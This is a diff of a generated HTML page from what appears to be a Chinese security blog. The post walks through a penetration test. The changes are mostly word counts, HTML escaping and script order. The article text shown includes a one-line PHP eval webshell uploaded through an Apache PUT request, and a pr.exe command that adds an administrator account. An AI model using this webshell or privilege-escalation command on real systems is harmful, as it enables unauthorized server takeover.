@@ -915,7 +915,7 @@ Windows 10（攻击机）
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        525
+                        528
                     </div>
                     
 
@@ -950,11 +950,11 @@ Windows 10（攻击机）
 <p>这里要Getshell的话，用到Apache PUT上传漏洞，至于怎么在Apache上支持PUT上传，可以参考<a href="https://blog.csdn.net/qq_42094992/article/details/107528183" target="_blank" rel="noopener">这篇文章</a>。</p>
 <h3 id="PUT上传"><a href="#PUT上传" class="headerlink" title="PUT上传"></a>PUT上传</h3><p>这里用Burp抓个包，测试一下网站支持哪些请求方式：<br><a href="https://imgtu.com/i/6kjU61" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/03/6kjU61.png" alt=""></a></p>
 <p>可以看到是支持PUT上传的，所以我们直接PUT一个shell.php到他网站的根目录</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">eval</span><span class="token punctuation">(</span>@<span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">eval</span><span class="token punctuation">(</span>@<span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>响应码201就代表我们上传成功了<br><a href="https://imgtu.com/i/6kjh0f" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/03/6kjh0f.png" alt=""></a></p>
 <p>然后用蚁剑连接一下，到这里Webshell成功拿下，剩下的就是提权了：<br><a href="https://imgtu.com/i/6kjb1s" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/03/6kjb1s.png" alt=""></a></p>
 <h3 id="内网提权"><a href="#内网提权" class="headerlink" title="内网提权"></a>内网提权</h3><p>中途蚁剑崩了…于是就用菜刀吧，这里我们把pr.exe传上去，然后执行添加用户的命令：</p>
-<pre class="line-numbers language-cmd"><code class="language-cmd">pr.exe "net user hack Passwd123+ /add && net localgroup administrators hack /add"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-cmd"><code class="language-cmd">pr.exe "net user hack Passwd123+ /add &amp;&amp; net localgroup administrators hack /add"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><a href="https://imgtu.com/i/6kjXn0" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/03/6kjXn0.png" alt=""></a></p>
 <p>超管账户有了，因为服务器在内网，只映射了80端口到公网，所以我们还是没法登陆3389，这时候就需要lcx来帮我们进行一个端口转发，来做一个内网穿透了。</p>
 <p>我们攻击机上执行：</p>
@@ -1793,7 +1793,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">107.4k</span> 字
+                <span class="white-color">121.8k</span> 字
 	<br>
             
 
@@ -2000,8 +2000,8 @@ $(function () {
       app_id: "XXXXX"
     });
   daovoice('update');
-  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  </script>
         
 
-    <script>!function(e){var c=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){for(var r=0;r<c.length;r++)t=c[r],0<=(n=t.getBoundingClientRect()).bottom&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=c[r];t=o,n=function(){c=c.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}i(),e.addEventListener("scroll",function(){var t,n;t=i,n=e,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)})}(this);</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script></body>
+    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --><script>!function(e){var c=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){for(var r=0;r<c.length;r++)t=c[r],0<=(n=t.getBoundingClientRect()).bottom&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=c[r];t=o,n=function(){c=c.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}i(),e.addEventListener("scroll",function(){var t,n;t=i,n=e,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)})}(this);</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script></body>
 </html>
